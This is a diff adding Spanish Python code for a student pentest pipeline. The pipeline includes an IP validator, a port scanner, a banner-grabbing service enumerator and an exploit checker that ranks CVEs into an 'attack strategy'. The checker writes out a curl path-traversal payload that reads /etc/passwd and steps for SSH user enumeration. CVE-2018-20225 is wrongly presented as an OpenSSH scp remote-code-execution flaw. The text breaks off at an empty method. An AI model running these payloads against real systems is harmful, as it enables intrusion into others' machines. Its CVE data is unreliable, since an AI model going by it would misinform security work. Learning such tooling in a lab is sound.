@@ -1,0 +1,2344 @@
+🚀 VAMOS A CONSTRUIR: AGENTE 1 - VALIDADOR DE IPs
+
+import re
+from typing import Dict, List
+
+class IPValidator:
+    """
+    Validador de direcciones IP.
+    
+    Propósito: Verificar que una IP sea válida y extraer información sobre ella.
+    
+    Autor: Diego Mercedes Llauger (2026-0048)
+    """
+    
+    def __init__(self):
+        """Inicializa el validador"""
+        self.ip_pattern = r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$'
+    
+    def validar(self, ip: str) -> Dict:
+        """
+        Valida una dirección IP y extrae información.
+        
+        Args:
+            ip (str): Dirección IP a validar (ej: "192.168.1.1")
+        
+        Returns:
+            Dict: Información sobre la IP
+        """
+        
+        # Paso 1: ¿Tiene formato básico?
+        match = re.match(self.ip_pattern, ip)
+        if not match:
+            return {
+                "válida": False,
+                "razón": "Formato inválido. Debe ser: ###.###.###.###",
+                "ejemplo": "192.168.1.1"
+            }
+        
+        # Paso 2: Extraer octetos
+        octetos = [int(match.group(i)) for i in range(1, 5)]
+        
+        # Verificar rango 0-255
+        for i, octeto in enumerate(octetos, 1):
+            if octeto > 255:
+                return {
+                    "válida": False,
+                    "razón": f"Octeto {i} ({octeto}) está fuera de rango 0-255",
+                    "ejemplo": "192.168.1.1"
+                }
+        
+        # Paso 3: Determinar tipo de IP (Clase A, B, C, etc.)
+        primer_octeto = octetos[0]
+        
+        if 1 <= primer_octeto <= 126:
+            tipo = "Clase A"
+        elif 128 <= primer_octeto <= 191:
+            tipo = "Clase B"
+        elif 192 <= primer_octeto <= 223:
+            tipo = "Clase C"
+        elif 224 <= primer_octeto <= 239:
+            tipo = "Clase D (Multicast)"
+        elif 240 <= primer_octeto <= 255:
+            tipo = "Clase E (Reservada)"
+        else:
+            tipo = "Desconocido"
+        
+        # Paso 4: ¿Es privada o pública?
+        if (octetos[0] == 192 and octetos[1] == 168) or \
+           (octetos[0] == 10) or \
+           (octetos[0] == 172 and 16 <= octetos[1] <= 31) or \
+           (octetos[0] == 127):
+            rango = "PRIVADA (local)"
+        else:
+            rango = "PÚBLICA (internet)"
+        
+        # Paso 5: ¿Es especial?
+        if octetos[0] == 127:
+            especial = "Localhost (tu computadora)"
+        elif octetos[0] == 0:
+            especial = "Red actual"
+        elif octetos[0] == 255:
+            especial = "Broadcast"
+        else:
+            especial = "Normal"
+        
+        # Retornar información completa
+        return {
+            "válida": True,
+            "ip": ip,
+            "octetos": octetos,
+            "tipo": tipo,
+            "rango": rango,
+            "especial": especial,
+            "interpretación": f"Esta es una IP {rango} (tipo {tipo})",
+            "siguiente_paso": "Pasar a escaneo de puertos"
+        }
+    
+    def explicar_privadas(self) -> str:
+        """Explica qué son IPs privadas"""
+        return """
+        IPs PRIVADAS (No visibles en internet):
+        
+        Rango 1: 10.0.0.0 - 10.255.255.255
+        Rango 2: 172.16.0.0 - 172.31.255.255
+        Rango 3: 192.168.0.0 - 192.168.255.255
+        
+        ¿Por qué existen?
+        - Tu hogar tiene múltiples dispositivos (celular, laptop, tablet)
+        - Cada uno necesita una dirección (local)
+        - Pero INTERNET no ve estas direcciones
+        - Es como casas en una calle privada: solo tú las ves
+        
+        Traducción: Tu router traduce IP privada → IP pública
+        """
+
+# Ejemplo de uso
+if __name__ == "__main__":
+    validador = IPValidator()
+    
+    # Pruebas
+    ips_prueba = [
+        "192.168.1.1",      # Válida, privada
+        "8.8.8.8",          # Válida, pública (Google DNS)
+        "127.0.0.1",        # Válida, localhost
+        "256.1.1.1",        # Inválida, octeto > 255
+        "192.168.1",        # Inválida, faltan octetos
+        "10.0.0.0"          # Válida, privada
+    ]
+    
+    print("=== VALIDADOR DE IPs ===\n")
+    
+    for ip in ips_prueba:
+        resultado = validador.validar(ip)
+        
+        if resultado["válida"]:
+            print(f"✓ {ip} → {resultado['rango']} ({resultado['tipo']})")
+        else:
+            print(f"✗ {ip} → ERROR: {resultado['razón']}")
+          
+            🤖 AGENTE 2: SCANNER DE PUERTOS
+
+
+import socket
+import threading
+import sys
+from datetime import datetime
+from typing import Dict, List, Tuple
+
+class PortScanner:
+    """
+    Scanner de puertos para reconocimiento de seguridad.
+    
+    Propósito: Identificar qué puertos están abiertos en una IP objetivo.
+    
+    ADVERTENCIA: Solo usar en máquinas autorizadas (laboratorio, máquinas virtuales propias).
+    Usar en máquinas de otros es ILEGAL.
+    
+    Autor: Diego Mercedes Llauger (2026-0048)
+    """
+    
+    # Base de datos de puertos conocidos
+    PUERTOS_CONOCIDOS = {
+        21: {"servicio": "FTP", "protocolo": "TCP", "riesgo": "CRÍTICO",
+             "descripción": "Transferencia de archivos (sin cifrado)"},
+        22: {"servicio": "SSH", "protocolo": "TCP", "riesgo": "ALTO",
+             "descripción": "Acceso remoto seguro (blanco común de fuerza bruta)"},
+        23: {"servicio": "Telnet", "protocolo": "TCP", "riesgo": "CRÍTICO",
+             "descripción": "Acceso remoto sin cifrado (PELIGROSO)"},
+        25: {"servicio": "SMTP", "protocolo": "TCP", "riesgo": "MEDIO",
+             "descripción": "Envío de correos"},
+        53: {"servicio": "DNS", "protocolo": "UDP/TCP", "riesgo": "BAJO",
+             "descripción": "Resolución de nombres"},
+        80: {"servicio": "HTTP", "protocolo": "TCP", "riesgo": "MEDIO",
+             "descripción": "Web sin cifrado"},
+        110: {"servicio": "POP3", "protocolo": "TCP", "riesgo": "BAJO",
+              "descripción": "Recibir correos"},
+        143: {"servicio": "IMAP", "protocolo": "TCP", "riesgo": "BAJO",
+              "descripción": "Recibir correos"},
+        443: {"servicio": "HTTPS", "protocolo": "TCP", "riesgo": "BAJO",
+              "descripción": "Web cifrado (seguro)"},
+        3306: {"servicio": "MySQL", "protocolo": "TCP", "riesgo": "ALTO",
+               "descripción": "Base de datos (inyección SQL)"},
+        3389: {"servicio": "RDP", "protocolo": "TCP", "riesgo": "ALTO",
+               "descripción": "Escritorio remoto Windows"},
+        5432: {"servicio": "PostgreSQL", "protocolo": "TCP", "riesgo": "ALTO",
+               "descripción": "Base de datos"},
+        8080: {"servicio": "HTTP alternativo", "protocolo": "TCP", "riesgo": "MEDIO",
+               "descripción": "Web alternativo"},
+        8443: {"servicio": "HTTPS alternativo", "protocolo": "TCP", "riesgo": "BAJO",
+               "descripción": "Web cifrado alternativo"},
+    }
+    
+    def __init__(self, timeout: int = 3):
+        """
+        Inicializa el scanner.
+        
+        Args:
+            timeout (int): Segundos para esperar respuesta de cada puerto
+        """
+        self.timeout = timeout
+        self.puertos_abiertos = []
+        self.puertos_cerrados = []
+        self.puertos_filtrados = []
+        self.lock = threading.Lock()  # Para seguridad en threads
+    
+    def escanear_puerto(self, ip: str, puerto: int) -> str:
+        """
+        Intenta conexión a un puerto específico.
+        
+        Args:
+            ip (str): IP objetivo
+            puerto (int): Puerto a escanear
+        
+        Returns:
+            str: "abierto", "cerrado" o "filtrado"
+        """
+        try:
+            # Crear socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(self.timeout)
+            
+            # Intentar conectar
+            resultado = sock.connect_ex((ip, puerto))
+            sock.close()
+            
+            # Interpretar resultado
+            if resultado == 0:
+                return "abierto"
+            else:
+                return "cerrado"
+        
+        except socket.timeout:
+            return "filtrado"
+        except Exception as e:
+            print(f"Error en puerto {puerto}: {e}")
+            return "error"
+    
+    def escanear_rango(self, ip: str, puertos: List[int]) -> Dict:
+        """
+        Escanea múltiples puertos (versión simple, no threaded).
+        
+        Args:
+            ip (str): IP objetivo
+            puertos (List[int]): Lista de puertos a escanear
+        
+        Returns:
+            Dict: Resultados del escaneo
+        """
+        print(f"\n[*] Escaneando {ip}...")
+        print(f"[*] Total de puertos: {len(puertos)}")
+        print(f"[*] Timeout: {self.timeout} segundos\n")
+        
+        inicio = datetime.now()
+        
+        for i, puerto in enumerate(puertos, 1):
+            estado = self.escanear_puerto(ip, puerto)
+            
+            # Mostrar progreso
+            print(f"[{i}/{len(puertos)}] Puerto {puerto}: {estado.upper()}", end="\r")
+            
+            # Clasificar resultado
+            if estado == "abierto":
+                self.puertos_abiertos.append(puerto)
+                print(f"[✓] Puerto {puerto} ABIERTO " + " " * 20)
+            
+            elif estado == "filtrado":
+                self.puertos_filtrados.append(puerto)
+            
+            else:
+                self.puertos_cerrados.append(puerto)
+        
+        tiempo_total = (datetime.now() - inicio).total_seconds()
+        
+        # Retornar resultados
+        return {
+            "ip": ip,
+            "puertos_abiertos": self.puertos_abiertos,
+            "puertos_cerrados": self.puertos_cerrados,
+            "puertos_filtrados": self.puertos_filtrados,
+            "tiempo_total": tiempo_total,
+            "detalles": self._obtener_detalles()
+        }
+    
+    def _obtener_detalles(self) -> Dict:
+        """Obtiene información detallada de puertos abiertos."""
+        detalles = {}
+        
+        for puerto in self.puertos_abiertos:
+            if puerto in self.PUERTOS_CONOCIDOS:
+                detalles[puerto] = self.PUERTOS_CONOCIDOS[puerto]
+            else:
+                detalles[puerto] = {
+                    "servicio": "Desconocido",
+                    "protocolo": "TCP",
+                    "riesgo": "DESCONOCIDO",
+                    "descripción": "Servicio no registrado"
+                }
+        
+        return detalles
+    
+    def _calcular_riesgo_general(self) -> str:
+        """Calcula el nivel de riesgo general basado en puertos abiertos."""
+        
+        puertos_criticos = 0
+        puertos_altos = 0
+        
+        for puerto in self.puertos_abiertos:
+            if puerto in self.PUERTOS_CONOCIDOS:
+                riesgo = self.PUERTOS_CONOCIDOS[puerto]["riesgo"]
+                
+                if riesgo == "CRÍTICO":
+                    puertos_criticos += 1
+                elif riesgo == "ALTO":
+                    puertos_altos += 1
+        
+        # Determinar riesgo general
+        if puertos_criticos > 0:
+            return f"🔴 CRÍTICO ({puertos_criticos} puertos críticos abiertos)"
+        elif puertos_altos >= 2:
+            return f"🟠 ALTO ({puertos_altos} puertos de alto riesgo)"
+        elif puertos_altos > 0:
+            return f"🟡 MEDIO ({puertos_altos} puerto de alto riesgo)"
+        else:
+            return "🟢 BAJO (sin puertos críticos abiertos)"
+    
+    def mostrar_resultados(self, resultados: Dict):
+        """Muestra los resultados en formato profesional."""
+        
+        print("\n" + "="*60)
+        print("RESULTADOS DEL ESCANEO DE PUERTOS")
+        print("="*60)
+        
+        print(f"\nIP objetivo: {resultados['ip']}")
+        print(f"Puertos abiertos: {len(resultados['puertos_abiertos'])}")
+        print(f"Puertos cerrados: {len(resultados['puertos_cerrados'])}")
+        print(f"Puertos filtrados: {len(resultados['puertos_filtrados'])}")
+        print(f"Tiempo total: {resultados['tiempo_total']:.2f} segundos")
+        
+        # Mostrar detalles de puertos abiertos
+        if resultados['detalles']:
+            print("\n" + "-"*60)
+            print("DETALLES DE PUERTOS ABIERTOS")
+            print("-"*60)
+            
+            for puerto, info in sorted(resultados['detalles'].items()):
+                print(f"\n📍 Puerto {puerto}: {info['servicio']}")
+                print(f"   Protocolo: {info['protocolo']}")
+                print(f"   Riesgo: {info['riesgo']}")
+                print(f"   Descripción: {info['descripción']}")
+        
+        # Riesgo general
+        print("\n" + "-"*60)
+        riesgo = self._calcular_riesgo_general()
+        print(f"Riesgo de seguridad: {riesgo}")
+        print("-"*60)
+        
+        # Recomendaciones
+        print("\n📋 RECOMENDACIONES:")
+        if len(resultados['puertos_abiertos']) > 0:
+            print("   1. Próximo paso: Enumerar versiones de servicios (AGENTE 3)")
+            print("   2. Buscar vulnerabilidades conocidas (AGENTE 4)")
+            print("   3. Intentar acceso si está autorizado (AGENTE 5)")
+        else:
+            print("   ✓ No hay puertos abiertos en rango común")
+            print("   • Intenta escaneo completo si necesitas verificación total")
+
+
+def main():
+    """Función principal."""
+    
+    print("╔════════════════════════════════════════╗")
+    print("║    AGENTE 2: SCANNER DE PUERTOS       ║")
+    print("║    Diego Mercedes Llauger (2026-0048) ║")
+    print("╚════════════════════════════════════════╝")
+    
+    # Obtener IP
+    ip = input("\nIngresa IP a escanear (ej: 192.168.1.1): ").strip()
+    
+    # Validar IP (simple)
+    if not _validar_ip_formato(ip):
+        print("❌ IP inválida")
+        return
+    
+    # Elegir rango
+    print("\n¿Qué puertos escanear?")
+    print("1. Puertos comunes (rápido)")
+    print("2. Todos los puertos (lento, ~30 minutos)")
+    opcion = input("Opción (1 o 2): ").strip()
+    
+    if opcion == "1":
+        puertos = list(PortScanner.PUERTOS_CONOCIDOS.keys())
+    elif opcion == "2":
+        # ⚠️ ADVERTENCIA: Escaneo completo toma MUCHO tiempo
+        print("\n⚠️  Advertencia: Esto toma ~30 minutos")
+        confirmar = input("¿Continuar? (S/N): ").strip().upper()
+        if confirmar != "S":
+            return
+        puertos = range(1, 65536)
+    else:
+        print("Opción inválida")
+        return
+    
+    # Timeout
+    try:
+        timeout = int(input("Timeout en segundos (recomendado: 3): ") or "3")
+    except ValueError:
+        timeout = 3
+    
+    # Ejecutar escaneo
+    scanner = PortScanner(timeout=timeout)
+    resultados = scanner.escanear_rango(ip, list(puertos))
+    
+    # Mostrar resultados
+    scanner.mostrar_resultados(resultados)
+    
+    # Guardar resultados
+    _guardar_resultados(ip, resultados)
+
+
+def _validar_ip_formato(ip: str) -> bool:
+    """Valida formato básico de IP."""
+    try:
+        partes = ip.split('.')
+        if len(partes) != 4:
+            return False
+        for parte in partes:
+            if not (0 <= int(parte) <= 255):
+                return False
+        return True
+    except:
+        return False
+
+
+def _guardar_resultados(ip: str, resultados: Dict):
+    """Guarda resultados en archivo."""
+    import json
+    
+    nombre_archivo = f"escaneo_{ip.replace('.', '_')}.json"
+    
+    try:
+        with open(nombre_archivo, 'w', encoding='utf-8') as f:
+            json.dump(resultados, f, indent=2, ensure_ascii=False)
+        print(f"\n✓ Resultados guardados en: {nombre_archivo}")
+    except Exception as e:
+        print(f"\n⚠️  Error guardando resultados: {e}")
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n\n⛔ Escaneo interrumpido por usuario")
+        sys.exit(0)          
+
+
+🤖 AGENTE 3: ENUMERADOR DE VERSIONES Y SERVICIOS
+
+
+import socket
+import re
+from typing import Dict, List, Optional
+from datetime import datetime
+
+class ServiceEnumerator:
+    """
+    Enumerador de servicios y versiones.
+    
+    Objetivo: Conectarse a puertos abiertos y obtener información sobre
+    qué servicio corre, en qué versión, y qué vulnerabilidades tiene.
+    
+    Autor: Diego Mercedes Llauger (2026-0048)
+    """
+    
+    # Base de datos de CVEs (En producción, usarías API de NVD)
+    CVE_DATABASE = {
+        ("OpenSSH", "7.4"): [
+            {
+                "cve": "CVE-2018-15473",
+                "descripción": "User enumeration via timing side-channel",
+                "severidad": "MEDIA",
+                "cvss": "5.3",
+                "impacto": "Enumeración de usuarios válidos sin autenticación"
+            },
+            {
+                "cve": "CVE-2018-20225",
+                "descripción": "Bash escape in scp filenames",
+                "severidad": "ALTA",
+                "cvss": "8.2",
+                "impacto": "Ejecución de código remoto potencial"
+            }
+        ],
+        ("Apache", "2.4.29"): [
+            {
+                "cve": "CVE-2018-1333",
+                "descripción": "Denial of Service via HTTP/2",
+                "severidad": "MEDIA",
+                "cvss": "5.9",
+                "impacto": "Denegación de servicio"
+            }
+        ],
+        ("nginx", "1.14.0"): [
+            {
+                "cve": "CVE-2019-9511",
+                "descripción": "HTTP/2 WINDOW_UPDATE DoS",
+                "severidad": "MEDIA",
+                "cvss": "6.5",
+                "impacto": "Denegación de servicio"
+            }
+        ],
+        ("MySQL", "5.7.25"): [
+            {
+                "cve": "CVE-2018-3282",
+                "descripción": "Information disclosure",
+                "severidad": "MEDIA",
+                "cvss": "4.0",
+                "impacto": "Lectura de información sensible"
+            }
+        ]
+    }
+    
+    def __init__(self, timeout: int = 5):
+        """
+        Inicializa enumerador.
+        
+        Args:
+            timeout (int): Segundos para esperar respuesta
+        """
+        self.timeout = timeout
+    
+    def enumerar_puerto(self, ip: str, puerto: int) -> Dict:
+        """
+        Enumera un puerto específico para obtener información de servicio.
+        
+        Args:
+            ip (str): IP objetivo
+            puerto (int): Puerto a enumerar
+        
+        Returns:
+            Dict: Información del servicio o error
+        """
+        
+        print(f"\n[*] Enumerando {ip}:{puerto}...")
+        
+        # Paso 1: Obtener banner
+        banner = self._obtener_banner(ip, puerto)
+        
+        if not banner:
+            return {
+                "puerto": puerto,
+                "estado": "sin_respuesta",
+                "razón": "El servidor no respondió"
+            }
+        
+        print(f"[+] Banner obtenido: {banner[:50]}...")
+        
+        # Paso 2: Parsear banner
+        servicio_info = self._parsear_banner(banner)
+        
+        if not servicio_info:
+            return {
+                "puerto": puerto,
+                "estado": "identificación_fallida",
+                "banner_crudo": banner,
+                "razón": "No se pudo identificar el servicio"
+            }
+        
+        # Paso 3: Buscar CVEs
+        clave_cve = (servicio_info["servicio"], servicio_info["versión"])
+        vulnerabilidades = self.CVE_DATABASE.get(clave_cve, [])
+        
+        # Paso 4: Generar recomendación
+        recomendación = self._generar_recomendación(
+            servicio_info["servicio"],
+            vulnerabilidades
+        )
+        
+        return {
+            "puerto": puerto,
+            "estado": "identificado",
+            "banner_crudo": banner,
+            "servicio": servicio_info["servicio"],
+            "versión": servicio_info["versión"],
+            "protocolo": servicio_info.get("protocolo", "desconocido"),
+            "cve_conocidas": vulnerabilidades,
+            "cve_count": len(vulnerabilidades),
+            "riesgo": self._calcular_riesgo(vulnerabilidades),
+            "recomendación": recomendación,
+            "timestamp": datetime.now().isoformat()
+        }
+    
+    def _obtener_banner(self, ip: str, puerto: int) -> Optional[str]:
+        """
+        Se conecta a un puerto y obtiene el banner (respuesta inicial).
+        
+        Args:
+            ip (str): IP objetivo
+            puerto (int): Puerto
+        
+        Returns:
+            Optional[str]: Banner o None
+        """
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(self.timeout)
+            
+            # Conectar
+            sock.connect((ip, puerto))
+            
+            # Algunos servidores responden sin enviar nada
+            # Otros responden cuando les hablas
+            # Intentamos ambos
+            
+            try:
+                # Esperar respuesta espontánea
+                banner = sock.recv(1024).decode('utf-8', errors='ignore')
+                if banner:
+                    sock.close()
+                    return banner.strip()
+            except socket.timeout:
+                pass
+            
+            # Si no respondió, intentar con "hello"
+            # (para servicios que esperan interacción)
+            try:
+                sock.send(b"HELP\r\n")
+                banner = sock.recv(1024).decode('utf-8', errors='ignore')
+                sock.close()
+                return banner.strip() if banner else None
+            except:
+                pass
+            
+            sock.close()
+            return None
+        
+        except Exception as e:
+            print(f"  [-] Error conectando: {e}")
+            return None
+    
+    def _parsear_banner(self, banner: str) -> Optional[Dict]:
+        """
+        Extrae servicio y versión del banner.
+        
+        Args:
+            banner (str): Respuesta del servidor
+        
+        Returns:
+            Optional[Dict]: Info de servicio o None
+        """
+        
+        # OpenSSH
+        if "OpenSSH" in banner:
+            match = re.search(r"OpenSSH_([0-9.]+)", banner)
+            if match:
+                return {
+                    "servicio": "OpenSSH",
+                    "versión": match.group(1),
+                    "protocolo": "SSH"
+                }
+        
+        # Apache
+        if "Apache" in banner:
+            match = re.search(r"Apache/([0-9.]+)", banner)
+            if match:
+                return {
+                    "servicio": "Apache",
+                    "versión": match.group(1),
+                    "protocolo": "HTTP"
+                }
+        
+        # nginx
+        if "nginx" in banner:
+            match = re.search(r"nginx/([0-9.]+)", banner)
+            if match:
+                return {
+                    "servicio": "nginx",
+                    "versión": match.group(1),
+                    "protocolo": "HTTP"
+                }
+        
+        # MySQL
+        if "MySQL" in banner or re.search(r"^[0-9.]+", banner):
+            match = re.search(r"([0-9]+\.[0-9]+\.[0-9]+)", banner)
+            if match:
+                return {
+                    "servicio": "MySQL",
+                    "versión": match.group(1),
+                    "protocolo": "MySQL"
+                }
+        
+        # Si el banner contiene versión pero no identificamos
+        return None
+    
+    def _calcular_riesgo(self, vulnerabilidades: List[Dict]) -> str:
+        """Calcula nivel de riesgo basado en CVEs."""
+        
+        if not vulnerabilidades:
+            return "🟢 BAJO (sin CVEs conocidas)"
+        
+        severidades = [cve.get("severidad", "") for cve in vulnerabilidades]
+        
+        if any(s == "CRÍTICA" for s in severidades):
+            return "🔴 CRÍTICO"
+        elif any(s == "ALTA" for s in severidades):
+            return "🟠 ALTO"
+        elif any(s == "MEDIA" for s in severidades):
+            return "🟡 MEDIO"
+        else:
+            return "🟢 BAJO"
+    
+    def _generar_recomendación(self, servicio: str, 
+                               vulnerabilidades: List[Dict]) -> str:
+        """Genera recomendación de ataque basado en vulnerabilidades."""
+        
+        if not vulnerabilidades:
+            return "Sin CVEs conocidas. Considera: fuerza bruta, default credentials, exploración manual"
+        
+        primera_vuln = vulnerabilidades[0]
+        desc = primera_vuln.get("descripción", "").lower()
+        
+        if "enumeration" in desc or "user" in desc:
+            return f"Enumerar usuarios válidos (CVE: {primera_vuln['cve']})"
+        
+        elif "injection" in desc or "sql" in desc:
+            return f"Intentar inyección SQL (CVE: {primera_vuln['cve']})"
+        
+        elif "execution" in desc or "remote" in desc:
+            return f"⚠️ CRÍTICO: Buscar exploit para {primera_vuln['cve']}"
+        
+        elif "dos" in desc or "denial" in desc:
+            return f"Servicio potencialmente vulnerable a DoS (CVE: {primera_vuln['cve']})"
+        
+        else:
+            return f"Investigar {primera_vuln['cve']} para más detalles"
+    
+    def mostrar_resultados(self, resultados: Dict):
+        """Muestra resultados en formato profesional."""
+        
+        print("\n" + "="*70)
+        print("ENUMERACIÓN DE SERVICIO")
+        print("="*70)
+        
+        if resultados["estado"] == "identificado":
+            print(f"\n✓ SERVICIO IDENTIFICADO")
+            print(f"  Puerto: {resultados['puerto']}")
+            print(f"  Servicio: {resultados['servicio']} {resultados['versión']}")
+            print(f"  Protocolo: {resultados['protocolo']}")
+            print(f"  Riesgo: {resultados['riesgo']}")
+            
+            # CVEs
+            if resultados['cve_count'] > 0:
+                print(f"\n📋 VULNERABILIDADES CONOCIDAS ({resultados['cve_count']}):")
+                
+                for i, cve in enumerate(resultados['cve_conocidas'], 1):
+                    print(f"\n  {i}. {cve['cve']}")
+                    print(f"     Descripción: {cve['descripción']}")
+                    print(f"     Severidad: {cve['severidad']} (CVSS: {cve['cvss']})")
+                    print(f"     Impacto: {cve['impacto']}")
+            
+            else:
+                print(f"\n✓ Sin CVEs conocidas en base de datos")
+            
+            # Recomendación
+            print(f"\n💡 RECOMENDACIÓN:")
+            print(f"   {resultados['recomendación']}")
+        
+        else:
+            print(f"\n✗ Error en enumeración")
+            print(f"  Razón: {resultados.get('razón', 'Desconocida')}")
+
+
+def main():
+    """Función principal."""
+    
+    print("╔════════════════════════════════════════╗")
+    print("║   AGENTE 3: ENUMERADOR DE SERVICIOS  ║")
+    print("║    Diego Mercedes Llauger (2026-0048) ║")
+    print("╚════════════════════════════════════════╝")
+    
+    ip = input("\nIP objetivo: ").strip()
+    puerto = int(input("Puerto a enumerar (ej: 22): ").strip())
+    timeout = int(input("Timeout en segundos (ej: 5): ") or "5")
+    
+    enumerador = ServiceEnumerator(timeout=timeout)
+    resultado = enumerador.enumerar_puerto(ip, puerto)
+    
+    enumerador.mostrar_resultados(resultado)
+    
+    # Guardar resultados
+    import json
+    nombre_archivo = f"enumeracion_{ip.replace('.', '_')}_{puerto}.json"
+    with open(nombre_archivo, 'w', encoding='utf-8') as f:
+        json.dump(resultado, f, indent=2, ensure_ascii=False)
+    print(f"\n✓ Resultados guardados en: {nombre_archivo}")
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n⛔ Interrupción del usuario")
+    except Exception as e:
+        print(f"\n❌ Error: {e}")
+
+
+🤖 AGENTE 4: VULNERABILITY CHECKER (VERIFICADOR DE VULNERABILIDADES)
+
+import json
+from typing import Dict, List, Optional
+from datetime import datetime
+
+class VulnerabilityChecker:
+    """
+    Verificador de vulnerabilidades y exploits públicos.
+    
+    Objetivo: Dado un servicio + versión + CVEs, buscar exploits públicos
+    disponibles y crear una estrategia de ataque priorizada.
+    
+    Autor: Diego Mercedes Llauger (2026-0048)
+    """
+    
+    # Base de datos de exploits PÚBLICOS (expandible)
+    EXPLOIT_DATABASE = {
+        "CVE-2018-15473": {
+            "servicio": "OpenSSH",
+            "versión": "7.4",
+            "descripción": "SSH User Enumeration via Timing Attack",
+            "tipo_exploit": "script_python",
+            "dificultad": "fácil",
+            "impacto": "ENUMERATION",
+            "pasos": [
+                "Paso 1: Instalar dependencias: pip install paramiko",
+                "Paso 2: Descargar script de https://github.com/Alkulkac/ssh-user-enum",
+                "Paso 3: Crear lista de usuarios posibles",
+                "Paso 4: python ssh_user_enum.py -target IP -users users.txt",
+                "Paso 5: Los usuarios válidos tardaran más tiempo (timing side-channel)"
+            ],
+            "url": "https://github.com/Alkulkac/ssh-user-enum",
+            "disponibilidad": "público",
+            "requiere_acceso_previo": False
+        },
+        "CVE-2018-20225": {
+            "servicio": "OpenSSH",
+            "versión": "7.4",
+            "descripción": "Bash escape in scp filenames - Remote Code Execution",
+            "tipo_exploit": "manual_bash",
+            "dificultad": "media",
+            "impacto": "RCE",
+            "pasos": [
+                "Paso 1: Crear archivo con nombre especial que incluya escape bash",
+                "Paso 2: Usar scp para copiar y ejecutar comando",
+                "Paso 3: El comando bash se ejecuta sin sandboxing"
+            ],
+            "url": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20225",
+            "disponibilidad": "público",
+            "requiere_acceso_previo": False
+        },
+        "CVE-2021-41773": {
+            "servicio": "Apache",
+            "versión": "2.4.49",
+            "descripción": "Path Traversal / Remote Code Execution",
+            "tipo_exploit": "curl_bash",
+            "dificultad": "fácil",
+            "impacto": "RCE",
+            "pasos": [
+                "Paso 1: curl -X GET 'http://target/cgi-bin/.%%32%65/.%%32%65/.%%32%65/etc/passwd'",
+                "Paso 2: Si funciona, puedes leer archivos del sistema",
+                "Paso 3: Potencial para ejecutar código via CGI scripts"
+            ],
+            "url": "https://www.exploit-db.com/exploits/50383",
+            "disponibilidad": "público",
+            "requiere_acceso_previo": False
+        }
+    }
+    
+    def __init__(self):
+        """Inicializa el verificador."""
+        pass
+    
+    def buscar_exploits(self, cves_encontradas: List[Dict]) -> Dict:
+        """
+        Busca exploits públicos para las CVEs encontradas.
+        
+        Args:
+            cves_encontradas (List[Dict]): Lista de CVEs del Agente 3
+        
+        Returns:
+            Dict: Exploits encontrados + estrategia recomendada
+        """
+        
+        print("\n[*] Buscando exploits públicos...")
+        print(f"[*] CVEs a investigar: {len(cves_encontradas)}\n")
+        
+        exploits_encontrados = []
+        exploits_no_encontrados = []
+        
+        # Búsqueda por CVE
+        for cve in cves_encontradas:
+            cve_id = cve.get("cve", "UNKNOWN")
+            print(f"[*] Investigando {cve_id}...")
+            
+            if cve_id in self.EXPLOIT_DATABASE:
+                exploit = self.EXPLOIT_DATABASE[cve_id]
+                exploits_encontrados.append({
+                    **exploit,
+                    "cve": cve_id,
+                    "encontrado": True
+                })
+                print(f"    [+] ✓ Exploit disponible ({exploit['tipo_exploit']})")
+            else:
+                exploits_no_encontrados.append(cve_id)
+                print(f"    [-] ✗ Sin exploit público conocido")
+        
+        # Priorizar exploits
+        exploits_priorizados = self._priorizar_exploits(exploits_encontrados)
+        
+        # Generar estrategia
+        estrategia = self._generar_estrategia(exploits_priorizados)
+        
+        resultado = {
+            "timestamp": datetime.now().isoformat(),
+            "exploits_encontrados": exploits_priorizados,
+            "exploits_no_encontrados": exploits_no_encontrados,
+            "total_exploits": len(exploits_encontrados),
+            "total_sin_exploit": len(exploits_no_encontrados),
+            "estrategia_recomendada": estrategia,
+            "proximo_paso": "Agente 5: Brute Force / Acceso"
+        }
+        
+        return resultado
+    
+    def _priorizar_exploits(self, exploits: List[Dict]) -> List[Dict]:
+        """
+        Prioriza exploits por:
+        1. Impacto (RCE > Enumeration > Information Disclosure)
+        2. Dificultad (fácil primero)
+        """
+        
+        impacto_orden = {
+            "RCE": 0,
+            "COMMAND_EXECUTION": 0,
+            "ENUMERATION": 1,
+            "INFORMATION_DISCLOSURE": 2,
+            "DOS": 3
+        }
+        
+        dificultad_orden = {
+            "fácil": 0,
+            "media": 1,
+            "difícil": 2
+        }
+        
+        # Ordenar primero por impacto, luego por dificultad
+        exploits_ordenados = sorted(
+            exploits,
+            key=lambda x: (
+                impacto_orden.get(x.get("impacto", ""), 99),
+                dificultad_orden.get(x.get("dificultad", ""), 99)
+            )
+        )
+        
+        return exploits_ordenados
+    
+    def _generar_estrategia(self, exploits: List[Dict]) -> str:
+        """Genera estrategia de ataque recomendada."""
+        
+        if not exploits:
+            return (
+                "📋 SIN EXPLOITS PÚBLICOS\n"
+                "   Alternativa: Usar Agente 5 (Brute Force SSH/Web)\n"
+                "   O investigar exploits 0-day (privados/desconocidos)"
+            )
+        
+        estrategia = "📋 ESTRATEGIA DE ATAQUE RECOMENDADA:\n\n"
+        
+        for i, exploit in enumerate(exploits, 1):
+            cve = exploit.get("cve", "UNKNOWN")
+            impacto = exploit.get("impacto", "UNKNOWN")
+            dificultad = exploit.get("dificultad", "?")
+            tipo = exploit.get("tipo_exploit", "?")
+            
+            estrategia += f"{i}. {cve} ({impacto})\n"
+            estrategia += f"   Dificultad: {dificultad}\n"
+            estrategia += f"   Tipo: {tipo}\n"
+            estrategia += f"   URL: {exploit.get('url', 'N/A')}\n\n"
+        
+        # Agregar recomendación de orden
+        if exploits:
+            primer_exploit = exploits[0]
+            if primer_exploit.get("impacto") == "RCE":
+                estrategia += "⚠️  RECOMENDACIÓN: Comenzar con el primer exploit (RCE)\n"
+                estrategia += "   → Si funciona, tendrás acceso de ejecución de código\n"
+                estrategia += "   → Si falla, pasar al siguiente"
+            else:
+                estrategia += "ℹ️  RECOMENDACIÓN: Comenzar con el primero (más viable)\n"
+                estrategia += "   → Usar para enumerar usuarios / información\n"
+                estrategia += "   → Luego intentar RCE o brute force"
+        
+        return estrategia
+    
+    def mostrar_resultados(self, resultados: Dict):
